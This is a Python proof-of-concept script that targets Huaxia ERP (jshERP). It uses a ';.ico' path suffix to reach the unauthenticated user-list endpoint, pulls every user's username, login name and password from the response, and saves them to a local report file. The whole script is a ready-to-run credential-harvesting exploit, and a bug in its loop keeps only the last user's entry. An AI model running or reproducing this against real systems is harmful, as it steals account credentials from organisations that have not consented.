import json
import requests
import time
import buter
import wirtefile

filename = "./reps/华夏erp信息泄露-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = "/jshERP-boot/user/getAllList;.ico"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
}
def huaxiaerpxxxl(url):
    try:
        reps = requests.get(url + poc, headers=headers, timeout=10, verify=False)
        if reps.status_code == 200 and '"code":200,' in reps.text:
            print(buter.colors.GREEN+  f"存在华夏erp信息泄露 url : {url}" + buter.colors.END)
            data = json.loads(reps.text)
            user_list = data["data"]["userList"]
            for user in user_list:
                username = user["username"]
                login_name = user["loginName"]
                password = user["password"]
                re_text =  f"url : {url} username : {username} Login Name : {login_name} Password : {password}"
            reptext = re_text
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现华夏erp信息泄露 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
